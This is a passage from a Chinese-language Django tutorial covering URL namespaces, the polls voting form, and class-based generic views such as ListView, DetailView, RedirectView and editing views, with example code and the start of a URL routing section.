Django会在polls.urls模块文件中查找name='detail'的url
如果想改变投票详情视图的URL比如改成polls/specifics/12/,不用在模板里重新修改url地址,仅仅只需要在polls/urls.py文件中将对应的正则表达式改成下面这样的就行了,所有模板中对它的引用都会自动修改成新的链接
path('specifics/< int:question_id>/', views.detail, name='detail'),

为URL names添加命名空间
实践项目只有一个应用polls,在真实的Django项目中可能会有多个应用,polls应用有detail视图,可能另一个博客应用也有同名的视图。Django如何分辨重名的URL,如何知道{% url %}标签到底对应哪一个应用的URL呢？
答案是使用URLconf的命名空间。在polls/urls.py文件的开头部分添加一个app_name的变量来指定该应用的命名空间

</pre><textarea>
from django.urls import path
from . import views

app_name = 'polls'
urlpatterns = [
    path('', views.index, name='index'),
    path('< int:question_id>/', views.detail, name='detail'),
    path('< int:question_id>/results/', views.results, name='results'),
    path('< int:question_id>/vote/', views.vote, name='vote'),
]

</textarea><textarea>
编辑polls/index.html文件,从:
< a href="{% url 'detail' question.id %}">{{ question.question_text }}< /a>
修改为指向具有命名空间的详细视图:
< a href="{% url 'polls:detail' question.id %}">{{ question.question_text }}< /a>

编写一个简单的表单
为了接收用户的投票选择,需要在前端页面显示一个投票界面,让它包含一个HTML form元素,重写先前的投票详细页面的模板polls/detail.html文件

forloop.counter是DJango模板系统专门提供的一个变量,用来表示当前循环的次数,一般用来给循环项目添加有序数标

由于创建的POST表单具有修改数据的作用,所以需要小心跨站点请求伪造CSRF的安全问题,Django已经拥有一个用来防御它的非常容易使用的系统,所有针对内部URL的POST表单内都应该使用{% csrf_token %}模板标签,但如果是用ajax的方式提交数据就不能用这个方法了

</textarea><textarea>
<h1>{{ question.question_text }}</h1>

{% if error_message %}<p><strong>{{ error_message }}</strong></p>{% endif %}

<form action="{% url 'polls:vote' question.id %}" method="post">
    {% csrf_token %}
    {% for choice in question.choice_set.all %}
        <input type="radio" name="choice" id="choice{{ forloop.counter }}" value="{{ choice.id }}">
        <label for="choice{{ forloop.counter }}">{{ choice.choice_text }}</label><br>
    {% endfor %}
    <input type="submit" value="Vote">
</form>

</textarea>实现处理用户投票结果polls/views.py<textarea>
from django.http import HttpResponse, HttpResponseRedirect
from django.shortcuts import get_object_or_404, render
from django.urls import reverse
from .models import Choice, Question

def vote(request, question_id):
    question = get_object_or_404(Question, pk=question_id)
    try:
        selected_choice = question.choice_set.get(pk=request.POST['choice'])
    except (KeyError, Choice.DoesNotExist):
        # Redisplay the question voting form.
        return render(request, 'polls/detail.html', {
            'question': question,
            'error_message': "You didn't select a choice.",
        })
    else:
        selected_choice.votes += 1
        selected_choice.save()
        # Always return an HttpResponseRedirect after successfully dealing with POST data. This prevents data from being posted twice if a user hits the Back button.
        return HttpResponseRedirect(reverse('polls:results', args=(question.id,)))

</textarea><pre>
request.POST是一个类字典对象,可以通过关键字的名字获取提交的数据,request.POST['choice']以字符串形式返回选择的Choice的ID,request.POST的值永远是字符串。Django还以同样的方式提供request.GET用于访问GET数据
如果在request.POST['choice']数据中没有提供choice,POST将引发一个KeyError。代码检查KeyError,如果没有给出choice将重新显示Question表单和一个错误信息。通常会给个默认值,防止这种异常的产生,例如request.POST['choice', None],一个None解决所有问题

username = request.POST.get('username')
get方法是Python字典类型的内置方法,它能够保证在没有指定键的情况下返回一个None,从而确保当数据请求中没有username键时不会抛出异常

在增加Choice的票数之后,代码返回一个HttpResponseRedirect而不是HttpResponse,HttpResponseRedirect只接收一个参数:重定向的URL
成功处理POST数据后应当保持一个良好的习惯,始终返回一个HttpResponseRedirect。这不仅仅是对Django而言,它是一个良好的WEB开发习惯
在这个例子中在HttpResponseRedirect的构造函数中使用reverse()函数,这个函数避免了在视图函数中硬编码URL。它首先需要一个在URLconf中指定的name,然后是传递的数据即视图函数需要的参数。reverse()调用将返回一个这样的字符串:'/polls/3/results/',其中3是question.id的值。重定向的URL将调用'polls:results'对应的视图并将question.id传递给它来显示最终的页面

当有人对Question进行投票后,vote()视图将请求重定向到Question的结果界面,使用模板渲染results视图

</pre><textarea>
def results(request, question_id):
    question = get_object_or_404(Question, pk=question_id)
    return render(request, 'polls/results.html', {'question': question})

# polls/templates/polls/results.html
<h1>{{ question.question_text }}</h1>

<ul>
    {% for choice in question.choice_set.all %}
        <li>{{ choice.choice_text }} -- {{ choice.votes }} vote{{ choice.votes|pluralize }}</li>
    {% endfor %}
</ul>

<a href="{% url 'polls:detail' question.id %}">Vote again?</a>

</textarea><pre>
现在在浏览器中访问/polls/1/然后为Question投票,应该看到一个投票结果页面,并且在每次投票之后都会更新。 如果提交时没有选择任何Choice应该看到错误信息

【 Django类视图、通用(generic)视图 】
所有的类视图都继承django.views.generic.base.View类

>>> print([e for e in dir(django.views.generic) if not e.startswith('_')])
['ArchiveIndexView', 'CreateView', 'DateDetailView', 'DayArchiveView', 'DeleteView', 'DetailView', 'FormView', 'GenericViewError', 'ListView', 'MonthArchiveView', 'RedirectView', 'TemplateView', 'TodayArchiveView', 'UpdateView', 'View', 'WeekArchiveView', 'YearArchiveView', 'base', 'dates', 'detail', 'edit', 'list']

>>> print([e for e in dir(django.views) if not e.startswith('_')])
['View', 'debug', 'decorators', 'generic', 'i18n']

Base views
 - View
 - TemplateView
 - RedirectView
Generic display views
 - DetailView
 - ListView
Generic editing views
 - FormView
 - CreateView
 - UpdateView
 - DeleteView
Generic date views
 - ArchiveIndexView
 - YearArchiveView
 - MonthArchiveView
 - WeekArchiveView
 - DayArchiveView
 - TodayArchiveView
 - DateDetailView
Class-based views mixins
 - Simple mixins
 - - ContextMixin
 - - TemplateResponseMixin
 - Single object mixins
 - - SingleObjectMixin
 - - SingleObjectTemplateResponseMixin
 - Multiple object mixins
 - - MultipleObjectMixin
 - - MultipleObjectTemplateResponseMixin
 - Editing mixins
 - - FormMixin
 - - ModelFormMixin
 - - ProcessFormView
 - - DeletionMixin
 - Date-based mixins
 - - YearMixin
 - - MonthMixin
 - - DayMixin
 - - WeekMixin
 - - DateMixin
 - - BaseDateListView
Class-based generic views - flattened index
 - Simple generic views
 - - View
 - - TemplateView
 - - RedirectView
 - Detail Views
 - - DetailView
 - List Views
 - - ListView
 - Editing views
 - - FormView
 - - CreateView
 - - UpdateView
 - - DeleteView
 - Date-based views
 - - ArchiveIndexView
 - - YearArchiveView
 - - MonthArchiveView
 - - WeekArchiveView
 - - DayArchiveView
 - - TodayArchiveView
 - - DateDetailView

用Django开发一个博客,需要做一个文章列表,文章详情页,这种需求是比较普遍的,所以Django中提供了Class-Based Views。

有时候想直接渲染一个模板,不得不写一个视图函数
def render_template_view(request): return render(request, '/path/to/template.html')
其实可以用TemplateView可以直接写在urls.py中,不需要定义一个这样的函数。
在urls.py中使用类视图的时候都是调用它的 .as_view() 函数

【 Base Views 】
1. django.views.generic.base.View
这个类是通用类的基类,其它类都是继承自这个类,一般不会用到这个类,个人感觉用函数更简单些。

</pre><textarea>
# views.py:
from django.http import HttpResponse
from django.views import View
class MyView(View):
    def get(self, request, *args, **kwargs):
        return HttpResponse('Hello, World!')

# urls.py:
from django.urls import path
from myapp.views import MyView
urlpatterns = [
    path('mine/', MyView.as_view(), name='my-view'),
]

</textarea><pre>
2. django.views.generic.base.TemplateView
Renders a given template, with the context containing parameters captured in the URL

super class:
django.views.generic.base.TemplateResponseMixin
django.views.generic.base.ContextMixin
django.views.generic.base.View

TemplateResponseMixin Attributes
template_name 必须
template_engine
response_class
content_type

TemplateResponseMixin Methods
render_to_response(context, **response_kwargs)¶
get_template_names()

ContextMixin Attributes
TemplateView.as_view(extra_context={'title': 'Custom Title'}) # add context

ContextMixin Methods
get_context_data(**kwargs)
在get_context_data()函数中可以传一些额外内容到模板

</pre><textarea>
# views.py
from django.views.generic.base import TemplateView
from articles.models import Article

class HomePageView(TemplateView):
    template_name = "home.html"
    def get_context_data(self, **kwargs):
        context = super().get_context_data(**kwargs)
        context['latest_articles'] = Article.objects.all()[:5]
        return context

# urls.py
from django.urls import path
from myapp.views import HomePageView
urlpatterns = [
    path('', HomePageView.as_view(), name='home'),
]

</textarea><pre>
3. django.views.generic.base.RedirectView
Redirects to a given URL,用来进行跳转,默认是永久重定向(301),可以直接在urls.py中使用

Attributes
url
The URL to redirect to, as a string. Or None to raise a 410 (Gone) HTTP error.

pattern_name
The name of the URL pattern to redirect to. Reversing will be done using the same args and kwargs as are passed in for this view.

permanent
Whether the redirect should be permanent. The only difference here is the HTTP status code returned. If True, then the redirect will use status code 301. If False, then the redirect will use status code 302. By default, permanent is False.

query_string
Whether to pass along the GET query string to the new location. If True, then the query string is appended to the URL. If False, then the query string is discarded. By default, query_string is False.

Methods
get_redirect_url(*args, **kwargs)
Constructs the target URL for redirection.
The default implementation uses url as a starting string and performs expansion of % named parameters in that string using the named groups captured in the URL.
If url is not set, get_redirect_url() tries to reverse the pattern_name using what was captured in the URL (both named and unnamed groups are used).
If requested by query_string, it will also append the query string to the generated URL. Subclasses may implement any behavior they wish, as long as the method returns a redirect-ready URL string.

</pre><textarea>
# views.py
from django.shortcuts import get_object_or_404
from django.views.generic.base import RedirectView
from articles.models import Article

class ArticleCounterRedirectView(RedirectView):
    url = ''              # 要跳转的网址,url可以不给,用pattern_name和get_redirect_url()来解析到要跳转的网址
    permanent = False     # 是否为永久重定向,默认True
    query_string = True   # 是否传递GET的参数到跳转网址,True时会传递,默认为False
    pattern_name = 'article-detail' # 用来跳转的URL

    # 如果url没有设定,此函数会尝试用pattern_name和从网址中捕捉的参数来获取对应网址,即reverse(pattern_name, args)得到相应的网址,在这个例子中是一个文章的点击数链接,点击后文章浏览次数加1,再跳转到真正的文章页面
    def get_redirect_url(self, *args, **kwargs):
        article = get_object_or_404(Article, pk=kwargs['pk'])
        article.update_counter() # 更新文章点击数,在models.py中实现
        return super().get_redirect_url(*args, **kwargs)

# urls.py
from django.conf.urls import patterns, url
from django.views.generic.base import RedirectView
from article.views import ArticleCounterRedirectView, ArticleDetail

urlpatterns = patterns('',
    path('counter/<int:pk>/', ArticleCounterRedirectView.as_view(), name='article-counter'),
    path('details/<int:pk>/', ArticleDetail.as_view(), name='article-detail'),
    path('go-to-django/', RedirectView.as_view(url='https://djangoproject.com'), name='go-to-django'),
    url('go-to-django/', RedirectView.as_view(url='http://www.study.com',permant=False), name='go-to-zqxt'),
)

</textarea><pre>
【 Generic Display View(通用显示视图) 】
1. django.views.generic.detail.DetailView
While this view is executing, self.object will contain the object that the view is operating upon

This view inherits methods and attributes from the following views:
django.views.generic.detail.SingleObjectTemplateResponseMixin
django.views.generic.base.TemplateResponseMixin
django.views.generic.detail.BaseDetailView
django.views.generic.detail.SingleObjectMixin
django.views.generic.base.View

DetailView有以下方法：
dispatch()
http_method_not_allowed()
get_template_names()
get_slug_field()
get_queryset()
get_object()
get_context_object_name()
get_context_data()
get()
render_to_response()

</pre><textarea>
# myapp/views.py
from django.views.generic.detail import DetailView
from django.utils import timezone
from articles.models import Article

# 模板名称,默认为应用名/类名_detail.html(即app/modelname_detail.html),可通过设置属性template_name='article_detail.html'指定
class ArticleDetailView(DetailView):
    model = Article # 要显示详情内容的模型类

    def get_context_data(self, **kwargs): # 在get_context_data()函数中可以用于传递一些额外的内容到网页
        context = super().get_context_data(**kwargs)
        context['now'] = timezone.now()
        return context

# myapp/urls.py
from django.conf.urls import url
from article.views import ArticleDetailView
urlpatterns = [
     path('<slug:slug>/', ArticleDetailView.as_view(), name='article-detail'),
]

# myapp/article_detail.html
<h1>标题：{{ object.title }}</h1>
<p>内容：{{ object.content }}</p>
<p>发表人: {{ object.reporter }}</p>
<p>发表于: {{ object.pub_date|date }}</p>
<p>日期: {{ now|date }}</p>

</textarea><pre>
2. django.views.generic.list.ListView
A page representing a list of objects.
While this view is executing, self.object_list will contain the list of objects (usually, but not necessarily a queryset) that the view is operating upon.

This view inherits methods and attributes from the following views:
django.views.generic.list.MultipleObjectTemplateResponseMixin
django.views.generic.base.TemplateResponseMixin
django.views.generic.list.BaseListView
django.views.generic.list.MultipleObjectMixin
django.views.generic.base.View

ListView有以下方法：
dispatch()
http_method_not_allowed()
get_template_names()
get_queryset()
get_context_object_name()
get_context_data()
get()
render_to_response()

</pre><textarea>
# myapp/views.py
from django.views.generic.list import ListView
from django.utils import timezone
from articles.models import Article

class ArticleListView(ListView):
    model = Article
    paginate_by = 100  # if pagination is desired

    def get_context_data(self, **kwargs):
        context = super().get_context_data(**kwargs)
        context['now'] = timezone.now()
        return context

# myapp/urls.py:
from django.conf.urls import url
from article.views import ArticleListView
urlpatterns = [
    url('', ArticleListView.as_view(), name='article-list'),
]

# myapp/article_list.html
<h1>文章列表</h1>
<ul>
{% for article in object_list %}
    <li>{{ article.pub_date|date }} - {{ article.headline }}</li>
{% empty %}
    <li>抱歉,目前还没有文章。</li>
{% endfor %}
</ul>

</textarea><pre>
【 Generic editing views 】
The following views are described on this page and provide a foundation for editing content:
django.views.generic.edit.FormView
django.views.generic.edit.CreateView
django.views.generic.edit.UpdateView
django.views.generic.edit.DeleteView

FormView
class django.views.generic.edit.FormView
A view that displays a form. On error, redisplays the form with validation errors; on success, redirects to a new URL.

This view inherits methods and attributes from the following views:
django.views.generic.base.TemplateResponseMixin
django.views.generic.edit.BaseFormView
django.views.generic.edit.FormMixin
django.views.generic.edit.ProcessFormView
django.views.generic.base.View

</pre><textarea>
# myapp/forms.py:
from django import forms

class ContactForm(forms.Form):
    name = forms.CharField()
    message = forms.CharField(widget=forms.Textarea)

    def send_email(self):
        # send email using the self.cleaned_data dictionary
        pass

# myapp/views.py:
from myapp.forms import ContactForm
from django.views.generic.edit import FormView

class ContactView(FormView):
    template_name = 'contact.html'
    form_class = ContactForm
    success_url = '/thanks/'

    def form_valid(self, form):
        # This method is called when valid form data has been POSTed,It should return an HttpResponse.
        form.send_email()
        return super().form_valid(form)

# myapp/contact.html:
<form method="post">
    {% csrf_token %}
    {{ form.as_p }}
    <input type="submit" value="Send message">
</form>

</textarea><pre>
CreateView
class django.views.generic.edit.CreateView
A view that displays a form for creating an object, redisplaying the form with validation errors (if there are any) and saving the object.

This view inherits methods and attributes from the following views:
django.views.generic.detail.SingleObjectTemplateResponseMixin
django.views.generic.base.TemplateResponseMixin
django.views.generic.edit.BaseCreateView
django.views.generic.edit.ModelFormMixin
django.views.generic.edit.FormMixin
django.views.generic.detail.SingleObjectMixin
django.views.generic.edit.ProcessFormView
django.views.generic.base.View

</pre><textarea>
# myapp/views.py:
from django.views.generic.edit import CreateView
from myapp.models import Author

class AuthorCreate(CreateView):
    model = Author
    fields = ['name']

# myapp/author_form.html:
<form method="post">
    {% csrf_token %}
    {{ form.as_p }}
    <input type="submit" value="Save">
</form>

</textarea><pre>
UpdateView
class django.views.generic.edit.UpdateView
A view that displays a form for editing an existing object, redisplaying the form with validation errors (if there are any) and saving changes to the object. This uses a form automatically generated from the object's model class (unless a form class is manually specified).

This view inherits methods and attributes from the following views:
django.views.generic.detail.SingleObjectTemplateResponseMixin
django.views.generic.base.TemplateResponseMixin
django.views.generic.edit.BaseUpdateView
django.views.generic.edit.ModelFormMixin
django.views.generic.edit.FormMixin
django.views.generic.detail.SingleObjectMixin
django.views.generic.edit.ProcessFormView
django.views.generic.base.View

</pre><textarea>
# myapp/views.py:
from django.views.generic.edit import UpdateView
from myapp.models import Author

class AuthorUpdate(UpdateView):
    model = Author
    fields = ['name']
    template_name_suffix = '_update_form'

# myapp/author_update_form.html:
<form method="post">
    {% csrf_token %}
    {{ form.as_p }}
    <input type="submit" value="Update">
</form>

</textarea><pre>
DeleteView
class django.views.generic.edit.DeleteView
A view that displays a confirmation page and deletes an existing object. The given object will only be deleted if the request method is POST. If this view is fetched via GET, it will display a confirmation page that should contain a form that POSTs to the same URL.

This view inherits methods and attributes from the following views:
django.views.generic.detail.SingleObjectTemplateResponseMixin
django.views.generic.base.TemplateResponseMixin
django.views.generic.edit.BaseDeleteView
django.views.generic.edit.DeletionMixin
django.views.generic.detail.BaseDetailView
django.views.generic.detail.SingleObjectMixin
django.views.generic.base.View

</pre><textarea>
# myapp/views.py:
from django.urls import reverse_lazy
from django.views.generic.edit import DeleteView
from myapp.models import Author

class AuthorDelete(DeleteView):
    model = Author
    success_url = reverse_lazy('author-list')

# myapp/author_confirm_delete.html:
<form method="post">
    {% csrf_token %}
    <p>Are you sure you want to delete "{{ object }}"?</p>
    <input type="submit" value="Confirm">
</form>

</textarea><pre>
【 Generic date views 】
Date-based generic views, provided in django.views.generic.dates, are views for displaying drilldown pages for date-based data.

</pre><textarea>
from django.db import models
from django.urls import reverse

class Article(models.Model):
    title = models.CharField(max_length=200)
    pub_date = models.DateField()

    def get_absolute_url(self):
        return reverse('article-detail', kwargs={'pk': self.pk})

</textarea><pre>
ArchiveIndexView
A top-level index page showing the "latest" objects, by date. Objects with a date in the future are not included unless you set allow_future to True.

</pre><textarea>
# myapp/urls.py:
from django.urls import path
from django.views.generic.dates import ArchiveIndexView
from myapp.models import Article

urlpatterns = [
    path('archive/', ArchiveIndexView.as_view(model=Article, date_field="pub_date"), name="article_archive"),
]

# myapp/article_archive.html:
<ul>
    {% for article in latest %}
        <li>{{ article.pub_date }}: {{ article.title }}</li>
    {% endfor %}
</ul>

</textarea><pre>
YearArchiveView
A yearly archive page showing all available months in a given year. Objects with a date in the future are not displayed unless you set allow_future to True.

</pre><textarea>
# myapp/views.py:
from django.views.generic.dates import YearArchiveView
from myapp.models import Article

class ArticleYearArchiveView(YearArchiveView):
    queryset = Article.objects.all()
    date_field = "pub_date"
    make_object_list = True
    allow_future = True

# myapp/urls.py:
from django.urls import path
from myapp.views import ArticleYearArchiveView

urlpatterns = [
    path('<int:year>/', ArticleYearArchiveView.as_view(), name="article_year_archive"),
]

# myapp/article_archive_year.html:
<ul>
    {% for date in date_list %}
        <li>{{ date|date }}</li>
    {% endfor %}
</ul>

<div>
    <h1>All Articles for {{ year|date:"Y" }}</h1>
    {% for obj in object_list %}
        <p>
            {{ obj.title }} - {{ obj.pub_date|date:"F j, Y" }}
        </p>
    {% endfor %}
</div>

</textarea><pre>
【 在URLconf中简单的使用通用视图 】
如果只是简单的做一些属性修改,可以使用as_view()方法,如下所示:

</pre><textarea>
from django.urls import path
from django.views.generic import TemplateView

urlpatterns = [
    path('about/', TemplateView.as_view(template_name="about.html")),
]

</textarea><pre>
【 继承通用视图 】
继承是最强大和有效的使用方式

</pre><textarea>
# some_app/views.py
from django.views.generic import TemplateView

class AboutView(TemplateView):
    template_name = "about.html"

# 然后就可以使用这个子类了,由于类不是函数,所以需要使用as_view()这个类方法将一个基于类的视图转换成函数形式的接口。
# urls.py
from django.urls import path
from some_app.views import AboutView

urlpatterns = [
    path('about/', AboutView.as_view()),
]

</textarea>一个访问图书馆最新一本书的例子<textarea>
# 路由:
from django.urls import path
from books.views import BookListView

urlpatterns = [
    path('books/', BookListView.as_view()),
]

# 视图:如果用户通过GET请求数据,那么将正常的返回响应数据。而如果通过HEAD请求,将使用head方法中的业务逻辑
from django.http import HttpResponse
from django.views.generic import ListView
from books.models import Book

class BookListView(ListView):
    model = Book

    def head(self, *args, **kwargs):
        last_book = self.get_queryset().latest('publication_date')
        response = HttpResponse('')
        # RFC 1123 date format
        response['Last-Modified'] = last_book.publication_date.strftime('%a, %d %b %Y %H:%M:%S GMT')
        return response

</textarea><pre>
基于类的视图和基于函数的视图比较:
通过HTTP请求方法的不同,将代码分隔在不同的类方法中,比如GET和POST,而不是类函数中的条件判断;
可以使用面向对象的技巧,比如混入
两者没有绝对的好坏和压倒性优势之分

早期人们在视图开发中发现了一些常见的习语和句式,也就是重复性代码和工作。于是引入了基于函数的通用视图来抽象这些模式,便于一般情况下的视图开发。
基于函数的通用视图的问题在于,尽管它们覆盖了简单的情况,但是除了一些简单的配置选项之外,没有办法扩展或定制它们,限制了它们在许多现实应用中的实用性。
基于类的通用视图与基于函数的通用视图的目标相同,都是想让视图开发更容易。由于类视图可以使用MIXIN等一些面向对象的方法和工具包,使得基于类的通用视图比基于函数的通用视图更具扩展性和灵活性

Django用来构建基于类的通用视图的基类和混合程序工具包是为了最大程度的灵活性而构建的,因此在默认方法实现和属性中有许多钩子,在最简单的用例中,这些方法是不太可能涉及的。Django给出了几种指定使用什么形式、从简单属性到完全动态可调用钩子的选项。对于简单的情况,这些选择似乎增加了复杂性,但没有它们,更先进的设计将受到限制。

一、使用基于类的视图

</pre><textarea>
# 在一个函数视图中处理一个GET请求通常如下:
from django.http import HttpResponse
def my_view(request):
    if request.method == 'GET':
        return HttpResponse('result')

# 而在类视图中则通过不同的类方法来处理:
rom django.http import HttpResponse
from django.views import View

class MyView(View):
    def get(self, request):
        return HttpResponse('result')

# 上面的继承关系非常重要,不能随便自己写一个类,这些都是Django提供的,不是Python的原生用法。
# 每个类视图都有一个as_view()方法,用于在urlconf中使用,这个方法会创建一个类视图的实例,并调用它的dispatch()方法,dispatch方法会在类中查找类似GET\POST之类的类方法,然后与请求request中的HTTP方法匹配,匹配上了就调用对应的代码,匹配不上就弹出异常HttpResponseNotAllowed。

# urls.py
from django.urls import path
from myapp.views import MyView

urlpatterns = [
    path('about/', MyView.as_view()),
]

</textarea>要重写或者覆盖一个类属性有两种办法<textarea>
### 第一种方法是继承父类,在子类中重写父类的属性
# 父类:
from django.http import HttpResponse
from django.views import View

class GreetingView(View):
    greeting = "Good Day"

    def get(self, request):
        return HttpResponse(self.greeting)

# 子类:
class MorningGreetingView(GreetingView):
    greeting = "Morning to ya"

### 另一种就是简单粗暴的在URLConf路由条目中修改as_view()方法的参数,当然参数名必须是存在的类属性
# 但是这种方式有很大的弊端,那就是虽然每次匹配上了url,类视图都会被实例化一次,但URLs却是在被导入的时候才配置一次,也就是as_view()方法的参数的配置只有一次,也就是说这么做就不能再改了,所以还是使用子类吧
urlpatterns = [
    path('about/', GreetingView.as_view(greeting="G'day")),
]

</textarea><pre>
二、使用mixin混入
混入是一种多父类继承的形式
MIXIN是跨多个类重用代码的一个很好的方法,但是它们会带来一些代价。代码散布在MIXIN中越多,阅读子类就越难,很难知道它到底在做什么。如果在对具有多级继承树的子类进行分类,就更难以判断子类的方法到底继承的是哪个先祖
需要注意的是父类中只有一个类可以继承最顶级的View类,其它的必须以mixin方法混入。

三、使用类视图处理表单

</pre><textarea>
# 一个用来处理表单的函数视图通常是下面这样的:
from django.http import HttpResponseRedirect
from django.shortcuts import render
from .forms import MyForm

def myview(request):
    if request.method == "POST":
        form = MyForm(request.POST)
        if form.is_valid():
            # process form cleaned data
            return HttpResponseRedirect('/success/')
    else:
        form = MyForm(initial={'key': 'value'})
    return render(request, 'form_template.html', {'form': form})

# 而如果用类视图来实现是这样的:
from django.http import HttpResponseRedirect
from django.shortcuts import render
from django.views import View
from .forms import MyForm

class MyFormView(View):
    form_class = MyForm
    initial = {'key': 'value'}
    template_name = 'form_template.html'

    def get(self, request, *args, **kwargs):
        form = self.form_class(initial=self.initial)
        return render(request, self.template_name, {'form': form})

    def post(self, request, *args, **kwargs):
        form = self.form_class(request.POST)
        if form.is_valid():
            # process form cleaned data
            return HttpResponseRedirect('/success/')
        return render(request, self.template_name, {'form': form})

</textarea><pre>
看起来类视图好像比函数视图代码多了很多,复杂了一些,但如果有多个类似的视图需要编写,那就可以发挥子类的继承和复写操作了,很容易整出个新的视图来。或者直接在URLConf中修改参数,或者两种操作同时使用

类视图适用于大量重复性的视图编写工作,在简单的场景下没几个视图需要编写,或者各个视图差别很大的情况时还是函数视图更有效,所以不要认为类视图是多么高大上的东西

四、装饰类视图
除了mixin,还可以使用装饰器扩展类视图,装饰器的作用取决于是在创建子类还是使用as_view()。

</pre><textarea>
### 用法一,在URLConf中直接装饰:
from django.contrib.auth.decorators import login_required, permission_required
from django.views.generic import TemplateView
from .views import VoteView

urlpatterns = [
    path('about/', login_required(TemplateView.as_view(template_name="secret.html"))),
    path('vote/', permission_required('polls.can_vote')(VoteView.as_view())),
]

# 上面怎么看都像是函数嵌套调用和链式调用。
# 同样的,这种方式也是在第一次初始化URL配置时才有效,不能做到每来一个请求都有效

## 用法二,在类视图中装饰:
from django.contrib.auth.decorators import login_required
from django.utils.decorators import method_decorator
from django.views.generic import TemplateView

class ProtectedView(TemplateView):
    template_name = 'secret.html'

    @method_decorator(login_required)
    def dispatch(self, *args, **kwargs):
        return super().dispatch(*args, **kwargs)

# 上面要把装饰器用在dispatch这个方法上才能在每次请求到达URL时实例化类视图时都运行这个装饰器的功能。
# 不是每个装饰器都能运用在类方法上,需要使用method_decorator这个装饰器的装饰器方法将装饰器运用在类方法上,即有很多的装饰器但其中有一些不能直接装饰dispatch这种类方法。那怎么办呢？套层壳！用method_decorator装饰器包裹起来,假装成一个能用的。

# 有时简单地用一下,可以写成下面地精简版,这么做代码更少,三行变一行,少敲了两次回车键,多了点偷懒地时间,但可定制性也更差
@method_decorator(login_required, name='dispatch')
class ProtectedView(TemplateView):
    template_name = 'secret.html'

# 有时可能需要对一个对象应用多个装饰器,正常做法如下,装饰器是有先后顺序的,never_cache就要先于login_required被调用。
@method_decorator(never_cache, name='dispatch')
@method_decorator(login_required, name='dispatch')
class ProtectedView(TemplateView):
    template_name = 'secret.html'

# 为了偷懒可以这么做:
decorators = [never_cache, login_required]
@method_decorator(decorators, name='dispatch')
class ProtectedView(TemplateView):
    template_name = 'secret.html'

</textarea><pre>
【 使用通用视图:代码还是少点好 】
detail()和results()视图都很简单,并且存在冗余问题。用来显示一个投票列表的index()视图和它们类似。
这些视图反映基本的Web开发中的一个常见情况:根据URL中的参数从数据库中获取数据、载入模板文件然后返回渲染后的模板。 由于这种情况特别常见,Django提供一种快捷方式叫做"通用视图"系统。
通用视图将常见的模式抽象化,可以使在编写应用时甚至不需要编写Python代码。

detail、index和results视图的代码非常相似,有点冗余,他们都具有类似的业务逻辑,实现类似的功能:通过从URL传递过来的参数去数据库查询数据,加载一个模板,利用刚才的数据渲染模板,返回这个模板。由于这个过程是如此的常见,于是Django提供了一种快捷方式,名为"通用视图"。

为什么要重构代码？
一般来说,当编写一个Django应用时应该先评估一下通用视图是否可以解决问题,应该在一开始使用,而不是进行到一半时重构代码

将原来的代码改为使用通用视图的方式整个过程分三步走:
修改URLconf设置
删除一些旧的无用的视图
采用基于类视图的新视图

</pre><textarea>
# 改良URLconf
from django.urls import path
from . import views

app_name = 'polls'
urlpatterns = [
    path('', views.IndexView.as_view(), name='index'),
    path('< int:pk>/', views.DetailView.as_view(), name='detail'),
    path('< int:pk>/results/', views.ResultsView.as_view(), name='results'),
    path('< int:question_id>/vote/', views.vote, name='vote'),
]

# 改良视图
# 修改polls/views.py文件,删除旧的index,detail和results视图,并用Django的通用视图代替

from django.http import HttpResponseRedirect
from django.shortcuts import get_object_or_404, render
from django.urls import reverse
from django.views import generic

from .models import Choice, Question

class IndexView(generic.ListView):
    template_name = 'polls/index.html'
    context_object_name = 'latest_question_list'

    def get_queryset(self):
        return Question.objects.order_by('-pub_date')[:5]  # Return the last five published questions

class DetailView(generic.DetailView):
    model = Question
    template_name = 'polls/detail.html'

class ResultsView(generic.DetailView):
    model = Question
    template_name = 'polls/results.html'

def vote(request, question_id):
    # 同前面的一样,不需要修改

</textarea><pre>
在这里使用两种通用视图:ListView和DetailView分别抽象"显示一个对象列表"和"显示一个特定类型对象的详细信息页面"这两种概念。
每个通用视图需要知道它将作用于哪个模型,这由model属性提供。
DetailView期望从URL中捕获名为"pk"的主键值,所以为通用视图把question_id改成pk
默认通用视图DetailView使用一个叫做< app name>/< model name>_detail.html的模板,示例中将使用"polls/detail.html"模板。template_name属性是用来告诉Django使用一个指定的模板名字,而不是自动生成的默认名字。也为results列表视图指定了template_name,这样就确保了虽然resulst视图和detail视图同样继承了DetailView类,使用了同样的model:Qeustion,但它们依然会显示不同的页面

类似地,ListView使用一个叫做< app name>/< model name>_list.html的默认模板,使用template_name来告诉ListView使用已经存在的"polls/index.html"模板,而不是使用它自己默认的那个

之前给模板提供了一个包含question和latest_question_list的上下文变量context,而对于DetailView,question变量会被自动提供,因为使用了Django的模型(Question),Django会智能的选择合适的上下文变量。然而对于ListView,自动生成的上下文变量是question_list。为了覆盖它,提供了context_object_name属性,指定希望使用latest_question_list而不是question_list。

启动服务器,使用一下基于通用视图的新投票应用。

</pre>
</div>

<div id="django_route">
<h4>URL路由</h4><pre>
URL是Web服务的入口,用户通过浏览器发送过来的任何请求都是发送到一个指定的URL地址,然后被响应。
在Django项目中编写路由就是向外暴露接收哪些URL的请求,除此之外的任何URL都不被处理,也没有返回,简单来说URL路由是Web服务对外暴露的API。
Django奉行DRY主义,提倡使用简洁、优雅的URL,没有.php或.cgi这种后缀,更不会单独使用0、2097、1-1-1928、00这样无意义的东西,可以随心所欲设计URL,不受框架束缚。

URL路由在Django项目中的体现就是urls.py文件,这个文件可以有很多个,但绝对不会在同一目录下。实际上Django提倡项目有个根urls.py,各app下分别有自己的一个urls.py,既集中又分治,是一种解耦的模式

一个URL模式定义了某种URL的基本格式,例如/newsarchive/< year>/< month>/
为了将URL和视图关联起来,Django使用了'URLconfs'来配置,URLconf将URL模式映射到视图

当用户请求一个页面时,Django根据下面的逻辑执行操作:
1、决定要使用的根URLconf模块,通常这是ROOT_URLCONF设置的值,但如果传入的HttpRequest对象具有urlconf属性(由中间件设置),则其值将被用于代替ROOT_URLCONF设置,即可以自定义项目入口url是哪个文件
2、加载该模块并寻找可用的urlpatterns,它是django.urls.path()或django.urls.re_path()实例的一个列表。
3、依次匹配每个URL模式,在与请求的URL相匹配的第一个模式停下来,即url匹配是从上往下的短路操作,所以url在列表中的位置非常关键。
4、导入并调用匹配行中给定的视图,该视图是一个简单的Python函数被称为视图函数或基于类的视图,视图将获得如下参数:
一个HttpRequest实例。
如果匹配的表达式返回了未命名的组,那么匹配的内容将作为位置参数提供给视图。
